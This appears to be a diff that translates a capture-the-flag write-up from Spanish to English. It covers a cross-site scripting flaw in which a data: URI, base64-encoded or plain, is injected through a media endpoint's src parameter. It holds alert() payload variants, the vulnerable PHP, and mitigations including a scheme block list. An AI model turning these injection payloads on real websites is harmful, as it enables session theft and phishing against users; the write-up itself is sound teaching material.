@@ -1,78 +1,78 @@
 # A7 - Cross-Site Scripting via Data URI
 
-Vulnerabilidad del OWASP Top 10 (2017). El parámetro `src` del endpoint `/index.php?page=media` se inyecta directamente en un elemento HTML sin validar el esquema de URL, permitiendo usar el esquema `data:` para incrustar código JavaScript arbitrario.
+OWASP Top 10 (2017) vulnerability. The `src` parameter of the `/index.php?page=media` endpoint is injected directly into an HTML element without validating the URL scheme, allowing use of the `data:` scheme to embed arbitrary JavaScript code.
 
 ---
 
-## Pasos para obtener la flag
+## Steps to Obtain the Flag
 
-### 1. Identificar el vector
+### 1. Identify the Vector
 
-Al pulsar la imagen de la NSA en la página principal se accede a:
+Clicking the NSA image on the main page accesses:
 ```
 http://<IP>/index.php?page=media&src=nsa
 ```
-El parámetro `src` controla el recurso cargado sin validación de esquema.
+The `src` parameter controls the loaded resource without scheme validation.
 
-### 2. Construir el payload
+### 2. Build the Payload
 
 ```bash
 echo -n "<script>alert(42)</script>" | base64
 # PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
 ```
 
-> En este reto solo funcionan los payloads codificados en **base64**.
+> In this challenge only **base64**-encoded payloads work.
 
-### 3. Inyectar el Data URI
+### 3. Inject the Data URI
 
 ```
 http://<IP>/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
 ```
 
-El servidor inserta el valor de `src` sin sanear en un elemento `<iframe>` u `<object>`. El navegador interpreta el Data URI, ejecuta el JS y la aplicación devuelve la **flag**.
+The server inserts the `src` value without sanitizing into an `<iframe>` or `<object>` element. The browser interprets the Data URI, executes the JS, and the application returns the **flag**.
 
-### 4. Por qué funciona
+### 4. Why It Works
 
-El código vulnerable hace algo similar a:
+The vulnerable code does something like:
 ```php
 $src = $_GET['src'];
 echo '<iframe src="' . $src . '"></iframe>';
 ```
-No valida el esquema (`data:`, `javascript:`, etc.), por lo que cualquier Data URI se procesa directamente.
+It doesn't validate the scheme (`data:`, `javascript:`, etc.), so any Data URI is processed directly.
 
 ---
 
-## Variantes de payload
+## Payload Variants
 
-| Técnica | Payload |
+| Technique | Payload |
 |---|---|
-| Directo | `data:text/html,<script>alert(42)</script>` |
+| Direct | `data:text/html,<script>alert(42)</script>` |
 | Base64 | `data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=` |
-| URL encoding | `data:text/html,%3Cscript%3Ealert(42)%3C/script%3E` |
+| URL Encoding | `data:text/html,%3Cscript%3Ealert(42)%3C/script%3E` |
 
 ---
 
-## Impacto
+## Impact
 
-- **Robo de sesión:** acceso a cookies y tokens de autenticación.
-- **Phishing:** inyección de contenido falso para capturar credenciales.
-- **XSS reflejado:** la URL maliciosa puede enviarse a otros usuarios.
-- **Keylogging y defacement** en el contexto del dominio vulnerable.
+- **Session Theft:** access to cookies and authentication tokens.
+- **Phishing:** injection of fake content to capture credentials.
+- **Reflected XSS:** malicious URL can be sent to other users.
+- **Keylogging and Defacement** in the vulnerable domain context.
 
 ---
 
-## Mitigación
+## Mitigation
 
-1. **Whitelist de recursos permitidos:** resolver el recurso en servidor con un mapa de claves internas, nunca usar el valor crudo del parámetro:
+1. **Whitelist of Allowed Resources:** resolve resource on server with a map of internal keys, never use raw parameter value:
    ```php
    $allowed = ['nsa' => '/media/nsa.jpg'];
    if (!isset($allowed[$_GET['src']])) { http_response_code(404); exit(); }
    echo '<object data="' . htmlspecialchars($allowed[$_GET['src']]) . '"></object>';
    ```
-2. **Bloquear esquemas peligrosos:** rechazar `data:`, `javascript:`, `vbscript:`.
-3. **Sanitizar la salida:** `htmlspecialchars($src, ENT_QUOTES, 'UTF-8')` antes de insertar en HTML.
+2. **Block Dangerous Schemes:** reject `data:`, `javascript:`, `vbscript:`.
+3. **Sanitize Output:** `htmlspecialchars($src, ENT_QUOTES, 'UTF-8')` before inserting into HTML.
 4. **Content Security Policy (CSP):**
    ```
    Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self'
    ```
-5. **Base64 no es seguridad:** es solo codificación; no protege contra ningún ataque.
+5. **Base64 is not Security:** it's just encoding; it doesn't protect against any attack.
